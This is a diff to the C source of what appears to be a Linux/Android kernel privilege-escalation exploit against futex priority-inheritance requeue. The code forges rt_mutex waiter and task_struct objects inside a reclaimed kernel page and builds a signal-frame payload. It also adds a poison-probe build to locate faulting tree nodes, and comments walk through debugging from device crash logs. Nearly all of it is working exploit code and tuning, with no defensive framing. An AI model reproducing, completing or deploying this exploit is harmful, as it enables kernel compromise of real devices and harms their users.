@@ -61,6 +61,7 @@ static void pi_v14_put64(size_t off, uint64_t value) {
   memcpy(g_payload + off, &value, sizeof(value));
 }
 
+#ifndef FUTEX_POISON_PROBE
 /*
  * Build the forged rt_mutex_waiter + rt_mutex_base pair.
  *
@@ -90,8 +91,27 @@ static void pi_v14_build_payload(const struct futex_pi_v14_config *cfg,
   pi_v14_put64(FUTEX_PI_V14_SIGNAL_PI_TREE_RIGHT, 0);
   pi_v14_put64(FUTEX_PI_V14_SIGNAL_PI_TREE_LEFT, 0);
 
-  /* task / lock: keep the traversal inside kernel memory (the reclaim page). */
-  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TASK, cfg->signal_scratch);
+  /* waiter->task MUST be the forged task_struct, not the scratch buffer.
+   *
+   * The reference (targets/afzh3/.../src/06_signal_frame_payload.c:32,42) writes
+   *   scratch_2380 = page_base | 0x2380ULL;  put64(g_payload, 0x48, scratch_2380);
+   * i.e. waiter->task points at the forged task_struct living inside the same page.
+   * In OUR geometry that address IS cfg->fake_task: util.c publishes
+   *   fake_task = slide_bank_payload_base + SLIDE_BANK_TASK_OFF   (SLIDE_BANK_TASK_OFF 0x1000)
+   * and the device log confirms the arithmetic -
+   *   FUTEX cfg page=ffffff88c1508000 ... task=ffffff88c150a380
+   *   0xa380 - 0x8000 = 0x2380
+   * so page+0x2380 == cfg->fake_task, matching the reference exactly.
+   *
+   * This previously pointed at cfg->signal_scratch (page + SCRATCH_OFF = page+0x3000),
+   * which is not a task_struct at all. The kernel dereferences waiter->task on the pi
+   * chain walk (pi_lock / pi_waiters / pi_top_task), so that mismatch is the concrete
+   * cause of the crash observed right after "consumer: entering sched_setattr":
+   *      futex-v14: waiter: SIGUSR1 payload install ok=1 reason=4 result=1
+   *      futex-v14: consumer: entering sched_setattr tid=25936 nice=1 state=1
+   *      <reboot>
+   * The frame installed cleanly; the walk that follows read a non-task_struct. */
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TASK, cfg->fake_task);
   pi_v14_put64(FUTEX_PI_V14_SIGNAL_LOCK, cfg->fake_lock);
 
   /* wake_state + prio as one 8-byte store: they straddle one aligned word. */
@@ -101,6 +121,161 @@ static void pi_v14_build_payload(const struct futex_pi_v14_config *cfg,
   /* rt_mutex_base.owner: an unowned lock ends the chain. */
   pi_v14_put64(FUTEX_PI_V14_SIGNAL_RT_MUTEX_OWNER, 0);
 }
+#endif /* !FUTEX_POISON_PROBE */
+
+#ifdef FUTEX_POISON_PROBE
+/*
+ * POISON PROBE build. See the long comment in futex_pi_v14.h: we do not yet
+ * know which of the two rb_node copies the kernel erases, so we point BOTH
+ * rb_right fields at distinct non-canonical sentinels and point BOTH
+ * rb_parent_color fields at a valid writable kernel address (cfg->fake_fops).
+ *
+ * The erase then runs to completion and the only faulting access is
+ *     *(child->__rb_parent_color_parent_slot)   rbtree_augmented.h:218
+ * i.e. the store lands on child == rb_right, so the faulting address names the
+ * node that was erased:
+ *
+ *   0xdeadbeefcafe0000 -> tree_entry    erased  (H1: rt_mutex_adjust_prio_chain)
+ *   0xdeadbeefcafe0008 -> pi_tree_entry erased  (H2: mark_wakeup_next_waiter)
+ *
+ * Note we deliberately do NOT use cfg->pi_waiters_self as the pi parent here.
+ * A self-referential pi root makes rb_erase_cached() take the
+ * `root->rb_leftmost == node` branch (rbtree.h:121) and call rb_next() on a node
+ * whose parent colour is a bare address, which walks into garbage before it
+ * ever reaches the poisoned store.
+ */
+/*
+ * Which sentinel(s) to arm, from $POISON_ARM:
+ *   b (default) - both tree_entry.rb_right and pi_tree_entry.rb_right
+ *   t           - only tree_entry.rb_right; pi_tree_entry.rb_right is set to a
+ *                 valid writable kernel address (cfg->fake_fops)
+ *   p           - only pi_tree_entry.rb_right
+ * An unarmed rb_right is a harmless self-contained write into our own reclaim
+ * page, so an all-valid run is a clean control: if it survives, the kernel
+ * never dereferenced that field.
+ */
+static char pi_v14_poison_arm(void) {
+  const char *a = getenv("POISON_ARM");
+  return (a && a[0]) ? a[0] : 'b';
+}
+
+/* =============================================================================
+ * rt_mutex PI object forge
+ * =============================================================================
+ * Populate the fake kernel objects the PI traversal walks. Until now the config
+ * only ever carried ADDRESSES (cfg.fake_task / cfg.fake_lock / cfg.signal_scratch
+ * were page_base + constant), so the reclaim page held whatever the slide put
+ * there and prio-chain traversal walked garbage. That is the recorded blocker.
+ *
+ * Direct port of the reference's 04_fake_kernel_objects.c. Our page geometry
+ * already agrees with it exactly:
+ *     reference TARGET_FAKE_LOCK_OFF  0x2210 == ours LOCK_OFF
+ *     reference TARGET_FAKE_WAITER_OFF 0x2350 == ours W0_OFF
+ *     reference TARGET_FAKE_TASK_OFF   0x3200 == ours FAKE_TASK_OFF
+ *     reference RECLAIM_BUFFER_SIZE    0x8e80 == ours SKB_SEND_SIZE
+ * so these offsets are the reference's, not guesses.
+ *
+ * The one idea worth stating: every intra-forge pointer is written as
+ * (aligned_base | its own offset), not as an absolute address. The content is
+ * written BEFORE the slide, so the page's final address is not yet known - but
+ * because every object lives in the same page, self-referencing the page base
+ * makes the graph internally consistent the instant the page lands, with no
+ * fixup pass required.
+ * ========================================================================== */
+
+static void forge_put64(unsigned char *page, size_t off, uint64_t v) {
+  memcpy(page + off, &v, sizeof(v));
+}
+
+static void forge_put32(unsigned char *page, size_t off, uint32_t v) {
+  memcpy(page + off, &v, sizeof(v));
+}
+
+void pi_v14_forge_page_objects(unsigned char *page, uint64_t aligned_base,
+                               uint64_t kernel_base, uint64_t ashmem_fops_addr,
+                               uint64_t init_task_addr) {
+  const uint64_t lock_waiters_self = aligned_base | LOCK_WAITERS_SELF_LIVE_OFF;
+  const uint64_t pi_waiters_self = aligned_base | PI_WAITERS_SELF_LIVE_OFF;
+  const uint64_t pi_parent = aligned_base | (uint64_t)FOPS_OFF;
+  const uint64_t waiter_lock =
+      aligned_base | (uint64_t)(W0_OFF + FAKE_WAITER_LOCK_OFF);
+  const uint64_t root_task_group = kernel_base + ROOT_TASK_GROUP_OFF;
+
+  /* rt_mutex_base: waiters root and leftmost both point at the self node, owner
+   * is a non-NULL sentinel. wait_lock stays 0 - the BUG_ON at
+   * rtmutex_common.h:118 requires exactly that. */
+  forge_put64(page, LOCK_OFF + RTMUTEX_WAIT_LOCK_OFF, 0);
+  forge_put64(page, LOCK_OFF + RTMUTEX_WAITERS_ROOT_OFF, lock_waiters_self);
+  forge_put64(page, LOCK_OFF + RTMUTEX_WAITERS_LEFTMOST_OFF, lock_waiters_self);
+  forge_put64(page, LOCK_OFF + RTMUTEX_OWNER_OFF, 1);
+
+  /* fake waiter task_struct: tree_entry.parent is 1 (the rb_root_cached tint
+   * that marks a root node); pi_tree_entry is parented at the forged fops so
+   * the pi chain has somewhere to walk. */
+  forge_put64(page, W0_OFF + RB_PARENT_OFF, 1);
+  forge_put64(page, W0_OFF + RB_RIGHT_OFF, 0);
+  forge_put64(page, W0_OFF + RB_LEFT_OFF, 0);
+  forge_put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + RB_PARENT_OFF,
+              pi_parent);
+  forge_put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + RB_RIGHT_OFF, 0);
+  forge_put64(page, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + RB_LEFT_OFF, 0);
+  forge_put64(page, W0_OFF + FAKE_WAITER_TASK_OFF, ashmem_fops_addr);
+  forge_put64(page, W0_OFF + FAKE_WAITER_LOCK_OFF, waiter_lock);
+  forge_put64(page, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
+  forge_put32(page, W0_OFF + FAKE_WAITER_PRIO_OFF, FAKE_WAITER_PRIO_VALUE);
+  forge_put64(page, W0_OFF + FAKE_WAITER_DEADLINE_OFF, 0);
+  forge_put64(page, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+
+  /* fake task_struct: exactly the fields rt_mutex_adjust_pi / rt_mutex_dequeue_pi
+   * read. pi_top_task must be init_task so the chain terminates on a real task;
+   * pi_blocked_on is 0 because we are not entered through a lock wait, which is
+   * why rt_mutex_adjust_pi cannot be our entry point. */
+  forge_put32(page, FAKE_TASK_OFF + TASK_USAGE_OFF, FAKE_TASK_USAGE_VALUE);
+  forge_put32(page, FAKE_TASK_OFF + TASK_PRIO_OFF, FAKE_TASK_PRIO_VALUE);
+  forge_put32(page, FAKE_TASK_OFF + TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO_VALUE);
+  forge_put64(page, FAKE_TASK_OFF + TASK_PI_LOCK_OFF, 0);
+  forge_put64(page, FAKE_TASK_OFF + TASK_PI_WAITERS_OFF, pi_waiters_self);
+  forge_put64(page, FAKE_TASK_OFF + TASK_PI_WAITERS_LEFTMOST_OFF, pi_waiters_self);
+  forge_put64(page, FAKE_TASK_OFF + TASK_TASK_GROUP_OFF, root_task_group);
+  forge_put64(page, FAKE_TASK_OFF + TASK_PI_TOP_TASK_OFF, init_task_addr);
+  forge_put64(page, FAKE_TASK_OFF + TASK_PI_BLOCKED_ON_OFF, 0);
+
+  /* two spare rb_nodes, both parented at pi_parent and childless */
+  forge_put64(page, RIGHT_OFF + RB_PARENT_OFF, pi_parent);
+  forge_put64(page, RIGHT_OFF + RB_RIGHT_OFF, 0);
+  forge_put64(page, RIGHT_OFF + RB_LEFT_OFF, 0);
+  forge_put64(page, LEFT_OFF + RB_PARENT_OFF, pi_parent);
+  forge_put64(page, LEFT_OFF + RB_RIGHT_OFF, 0);
+  forge_put64(page, LEFT_OFF + RB_LEFT_OFF, 0);
+}
+
+static void pi_v14_build_payload(const struct futex_pi_v14_config *cfg,
+                                 uint64_t parent, uint64_t right) {
+  char arm = pi_v14_poison_arm();
+  int arm_tree = (arm == 'b' || arm == 't');
+  int arm_pi = (arm == 'b' || arm == 'p');
+
+  (void)parent;
+  (void)right;
+  memset(g_payload, 0, sizeof(g_payload));
+
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TREE_PARENT, cfg->fake_fops);
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TREE_RIGHT,
+               arm_tree ? FUTEX_PI_V14_POISON_TREE_RIGHT : cfg->fake_fops);
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TREE_LEFT, 0);
+
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_PI_TREE_PARENT, cfg->fake_fops);
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_PI_TREE_RIGHT,
+               arm_pi ? FUTEX_PI_V14_POISON_PI_TREE_RIGHT : cfg->fake_fops);
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_PI_TREE_LEFT, 0);
+
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_TASK, cfg->signal_scratch);
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_LOCK, cfg->fake_lock);
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_WAKE_STATE,
+               FUTEX_PI_V14_SIGNAL_WAKE_STATE_PRIO);
+  pi_v14_put64(FUTEX_PI_V14_SIGNAL_RT_MUTEX_OWNER, 0);
+}
+#endif /* FUTEX_POISON_PROBE */
 
 /*
  * SIGUSR1 handler on the waiter.
@@ -474,6 +649,64 @@ static void *pi_v14_waiter_fn(void *arg) {
   pi_v14_diag("waiter: returned from WAIT_REQUEUE_PI ret=%ld errno=%d",
               wait_ret, wait_errno);
 
+  /* ------------------------------------------------------------------------
+   * Repair the kernel state that the EDEADLK requeue above leaves behind on
+   * THIS thread, before anything can walk it.
+   *
+   * The requeue fails in rt_mutex_start_proxy_lock(), whose failure cleanup is
+   * remove_waiter() (kernel/locking/rtmutex_api.c:330).  remove_waiter() does
+   * `current->pi_blocked_on = NULL` (kernel/locking/rtmutex.c:1470) - but
+   * `current` there is MAIN, the thread that issued FUTEX_CMP_REQUEUE_PI,
+   * while task_blocks_on_rt_mutex() wrote the field for THIS thread at
+   * rtmutex.c:1164.  The store is therefore never undone: waiter_tid's
+   * pi_blocked_on is left pointing at the rt_waiter local of
+   * futex_wait_requeue_pi(), a frame that died when that syscall returned and
+   * whose bytes the diag line above has already overwritten.
+   *
+   * sched_setattr() unconditionally reaches rt_mutex_adjust_pi()
+   * (kernel/sched/core.c:7723), which reads task->pi_blocked_on
+   * (rtmutex_api.c:444) and, when it is non-NULL and stale, follows it into
+   * rt_mutex_adjust_prio_chain() - `lock = waiter->lock` at rtmutex.c:772 and
+   * `raw_spin_trylock(&lock->wait_lock)` at rtmutex.c:778 dereference whatever
+   * is left in that dead stack frame.  That is why every previous run died at
+   * "consumer: entering sched_setattr" without ever reaching a forged object,
+   * and why the three payload fixes could not move the crash: they are never
+   * consulted.
+   *
+   * FUTEX_LOCK_PI(pi_target) from THIS thread reproduces exactly the same
+   * cycle - pi_target is still held by the owner, and the owner is still
+   * blocked on pi_chain, which we hold - so task_blocks_on_rt_mutex() runs
+   * again and rewrites pi_blocked_on, and the same EDEADLK cleanup runs again.
+   * This time current == task, so remove_waiter() clears OUR field.  The owner
+   * has been parked on pi_chain since just after owner_started, and main sleeps
+   * FUTEX_PI_V14_PAUSE_USEC before requeueing, so this call cannot block: had
+   * the owner not been blocked, main would not have seen EDEADLK either.
+   *
+   * The return value is expected to be -1/EDEADLK and is logged only.  The
+   * success signal for this repair is not this line - it is the consumer's
+   * "sched_setattr ... ret=" line, which can only appear if the dereference
+   * above no longer happens.
+   * ---------------------------------------------------------------------- */
+  {
+    uint32_t pt_word = __atomic_load_n(&g_state.pi_target, __ATOMIC_ACQUIRE);
+    uint32_t pt_owner = pt_word & 0x3fffffffu; /* FUTEX_TID_MASK */
+    if (pt_owner != 0 && pt_owner != (uint32_t)tid) {
+      pi_v14_diag("waiter: repairing stale pi_blocked_on via "
+                  "LOCK_PI(pi_target) word=%08x owner=%u self=%d",
+                  pt_word, pt_owner, tid);
+      errno = 0;
+      long clear_ret = pi_v14_futex(&g_state.pi_target, FUTEX_PI_V14_OP_LOCK_PI,
+                                    0, NULL, NULL, 0);
+      int clear_errno = errno;
+      pi_v14_diag("waiter: pi_blocked_on repair attempt done ret=%ld "
+                  "errno=%d (EDEADLK expected)", clear_ret, clear_errno);
+    } else {
+      pi_v14_diag("waiter: pi_blocked_on repair SKIPPED (pi_target word=%08x "
+                  "owner=%u self=%d); the requeue did not leave an owner to "
+                  "recreate the cycle", pt_word, pt_owner, tid);
+    }
+  }
+
   /* Reset the handshake and publish state = -1. The consumer's ONLY job for
    * state == -1 is to open the gate and nothing else. */
   atomic_store(&g_state.sched_done, 0);
@@ -509,6 +742,11 @@ static void *pi_v14_waiter_fn(void *arg) {
     /* Publish state = 1. From here the consumer will, and only the consumer
      * will, cross the mutation boundary. */
     atomic_store(&g_state.state, 1);
+    /* Say so explicitly. Previously the last thing on the wire was the payload-install line, so
+     * a run that stopped there was ambiguous between "state was never published" and "the consumer
+     * never acted on it". These two lines - publish here, consume below - bracket the hand-off and
+     * make it unambiguous which side stopped. */
+    pi_v14_diag("waiter: published state=1, waiting for sched_done");
     for (uint64_t spins = 0;
          spins <= FUTEX_PI_V14_LONG_SPIN_MAX &&
          !atomic_load(&g_state.sched_done);
@@ -562,8 +800,14 @@ static void *pi_v14_owner_fn(void *arg) {
   while (!atomic_load(&g_state.stop)) {
     usleep(FUTEX_PI_V14_POLL_USEC);
   }
-  (void)pi_v14_futex(&g_state.pi_target, FUTEX_PI_V14_OP_UNLOCK_PI, 0, NULL,
-                     NULL, 0);
+  errno = 0;
+  long unlock_ret = pi_v14_futex(&g_state.pi_target, FUTEX_PI_V14_OP_UNLOCK_PI,
+                                 0, NULL, NULL, 0);
+  int unlock_errno = errno;
+  /* Logged because the waiter's pi_blocked_on repair sets FUTEX_WAITERS on
+   * this word; a failure here would show up as a stuck owner on a retry. */
+  pi_v14_diag("owner: UNLOCK_PI(pi_target) ret=%ld errno=%d", unlock_ret,
+              unlock_errno);
   return NULL;
 }
 
@@ -628,6 +872,13 @@ static void *pi_v14_consumer_fn(void *arg) {
     /* ---- MUTATION BOUNDARY: this is the call that lets the kernel publish
      * the forged pointer. Everything either side of it is bookkeeping. */
     atomic_fetch_add_explicit(&g_state.attempt_count, 1, memory_order_relaxed);
+    /* Log BEFORE the syscall, not only after. The post-call line at the end of this block cannot
+     * appear if the kernel never returns from sched_setattr, which is exactly the case we are
+     * trying to distinguish from "the consumer never got here". With this line present, a log that
+     * ends here proves the kernel was entered and did not return; its absence proves the consumer
+     * never reached the mutation boundary at all. */
+    pi_v14_diag("consumer: entering sched_setattr tid=%d nice=%d state=%d",
+                tid, FUTEX_PI_V14_SETAUNCH_NICE, state);
     errno = 0;
     long ret = pi_v14_sched_setattr(tid, FUTEX_PI_V14_SETAUNCH_NICE);
     int sched_errno = errno;
